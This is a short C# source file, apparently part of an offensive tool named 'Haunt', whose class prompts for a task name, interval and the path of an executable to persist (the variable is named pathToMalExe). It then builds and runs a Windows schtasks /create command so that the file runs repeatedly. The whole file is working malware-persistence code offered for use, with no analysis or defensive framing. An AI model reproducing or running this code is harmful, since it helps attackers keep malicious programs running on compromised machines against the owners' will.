using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Haunt.Method
{
    public class ScheduledTask
    {
        public ScheduledTask()
        {
            Console.WriteLine("Please enter a name for the task: ");
            string name = Console.ReadLine();
            Console.WriteLine("Please enter a description for the task: ");
            string description = Console.ReadLine();
            Console.WriteLine("Please enter an interval at which to execute the task (in minutes): ");
            string minuteInterval = Console.ReadLine();
            Console.WriteLine("Please enter the path of the executable you would like to persist: ");
            string pathToMalExe = Console.ReadLine();

            createTask(name, description, Convert.ToInt32(minuteInterval), pathToMalExe);
        }

        public void createTask(string name, string description, int minuteInterval, string pathToMalExe)
        {
            // Build the command to create a daily scheduled task
            string command = $"schtasks /create /tn \"{name}\" /tr \"{pathToMalExe}\" /sc MINUTE /mo {minuteInterval}";

            Util.ExecuteCommand(command);
        }
    }
}
